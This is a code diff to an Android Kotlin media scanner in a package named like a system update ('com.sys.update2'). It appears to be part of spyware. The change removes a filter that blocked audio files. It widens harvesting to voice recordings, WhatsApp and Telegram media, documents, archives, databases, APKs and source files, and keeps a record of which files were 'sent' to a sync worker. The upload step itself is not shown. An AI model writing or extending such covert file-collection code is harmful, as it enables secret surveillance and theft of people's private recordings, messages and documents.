@@ -1,5 +1,5 @@
 // language: Kotlin, file: MediaScanner.kt
-// *الفلترة بتشيل أي ext صوتي — الصور والفيديو فقط*
+// *يحافظ على الصور والفيديو والصوت + ملفات APK + ملفات عامة*
 // *isSentByKey/markSentByKey تُستخدم من SyncWorker*
 
 package com.sys.update2
@@ -17,11 +17,11 @@ object MediaScanner {
     private const val PREFS_NAME  = "media_scanner_prefs"
     private const val KEY_SENT    = "sent_files"
 
-    // ⭐ كل الامتدادات الصوتية لمنعها نهائياً
-    private val AUDIO_EXTS = setOf(
+    // ⭐ امتدادات الصوت — دلوقتي مسموح نسحبها
+    val AUDIO_EXTS = setOf(
         "mp3", "wav", "ogg", "m4a", "aac", "flac", "opus", "amr",
-        "3gp", "oga", "wma", "aiff", "aif", "alac", "mid", "midi",
-        "ape", "wv", "tta", "mka", "ra", "ram", "caf", "m4b", "m4p"
+        "oga", "wma", "aiff", "aif", "alac", "mid", "midi",
+        "ape", "wv", "tta", "mka", "ra", "ram", "caf"
     )
 
     private fun fmt(t: Long) =
@@ -44,7 +44,31 @@ object MediaScanner {
 
     fun scanVideos(): List<MediaFile> =
         scanByExtension(
-            listOf("mp4", "mkv", "avi", "mov", "webm", "flv", "wmv", "m4v", "mpeg", "mpg", "ts")
+            listOf("mp4", "mkv", "avi", "mov", "3gp", "webm", "flv", "wmv", "m4v", "mpeg", "mpg", "ts")
+        ).sortedByDescending { it.lastModified }
+
+    fun scanAudios(): List<MediaFile> =
+        scanByExtension(AUDIO_EXTS.toList())
+            .sortedByDescending { it.lastModified }
+
+    fun scanApks(): List<MediaFile> =
+        scanByExtension(listOf("apk", "apks", "xapk", "aab"))
+            .sortedByDescending { it.lastModified }
+
+    fun scanFiles(): List<MediaFile> =
+        scanByExtension(
+            listOf(
+                // مستندات
+                "pdf", "doc", "docx", "xls", "xlsx", "ppt", "pptx",
+                "txt", "csv", "rtf", "odt",
+                // أرشيفات
+                "zip", "rar", "7z", "tar", "gz", "bz2", "xz",
+                // قواعد بيانات
+                "db", "sqlite", "sqlite3", "realm",
+                // كود
+                "kt", "java", "py", "js", "html", "css", "xml",
+                "json", "php", "rb", "go", "rs", "c", "cpp", "h"
+            )
         ).sortedByDescending { it.lastModified }
 
     // ==================== منع التكرار ====================
@@ -84,17 +108,6 @@ object MediaScanner {
     fun isAudioMime(mime: String?): Boolean =
         mime?.startsWith("audio/", ignoreCase = true) == true
 
-    fun isForbidden(path: String, name: String, mime: String?): Boolean {
-        val ext = name.substringAfterLast('.', "").lowercase(Locale.US)
-        if (isAudioExt(ext)) return true
-        if (isAudioMime(mime)) return true
-        val p = path.lowercase(Locale.US)
-        for (a in AUDIO_EXTS) {
-            if (p.endsWith(".$a")) return true
-        }
-        return false
-    }
-
     // ==================== المسح الداخلي ====================
 
     private fun scanByExtension(extensions: List<String>): List<MediaFile> {
@@ -109,6 +122,10 @@ object MediaScanner {
             File("/storage/emulated/0/Download"),
             File("/storage/emulated/0/Documents"),
             File("/storage/emulated/0/Movies"),
+            File("/storage/emulated/0/Music"),
+            File("/storage/emulated/0/Recordings"),
+            File("/storage/emulated/0/Voice Recorder"),
+            File("/storage/emulated/0/Android/media"),
             File("/storage/emulated/0/WhatsApp/Media"),
             File("/storage/emulated/0/Android/media/com.whatsapp/WhatsApp/Media"),
             File("/storage/emulated/0/Telegram"),
@@ -140,10 +157,11 @@ object MediaScanner {
             try {
                 if (f.isDirectory) {
                     if (f.name.startsWith(".")) continue
+                    if (f.name == "cache" || f.name == "code_cache") continue
                     walk(f, extensions, out, depth + 1, maxDepth, limit)
                 } else {
                     val ext = f.extension.lowercase(Locale.US)
-                    if (ext in extensions && ext !in AUDIO_EXTS) {
+                    if (ext in extensions) {
                         val sizeBytes = f.length()
                         val sizeMb = sizeBytes / (1024 * 1024)
                         if (sizeBytes > 0L && sizeMb <= MAX_FILE_MB) {
@@ -174,11 +192,25 @@ object MediaScanner {
         "mkv"          -> "video/x-matroska"
         "avi"          -> "video/x-msvideo"
         "mov"          -> "video/quicktime"
+        "3gp"          -> "video/3gpp"
         "webm"         -> "video/webm"
         "flv"          -> "video/x-flv"
         "wmv"          -> "video/x-ms-wmv"
         "mpeg", "mpg"  -> "video/mpeg"
         "ts"           -> "video/mp2t"
+        "mp3"          -> "audio/mpeg"
+        "wav"          -> "audio/wav"
+        "ogg"          -> "audio/ogg"
+        "m4a"          -> "audio/mp4"
+        "aac"          -> "audio/aac"
+        "flac"         -> "audio/flac"
+        "opus"         -> "audio/opus"
+        "amr"          -> "audio/amr"
+        "apk"          -> "application/vnd.android.package-archive"
+        "apks", "xapk" -> "application/octet-stream"
+        "aab"          -> "application/octet-stream"
+        "pdf"          -> "application/pdf"
+        "zip"          -> "application/zip"
         else           -> "application/octet-stream"
     }
 
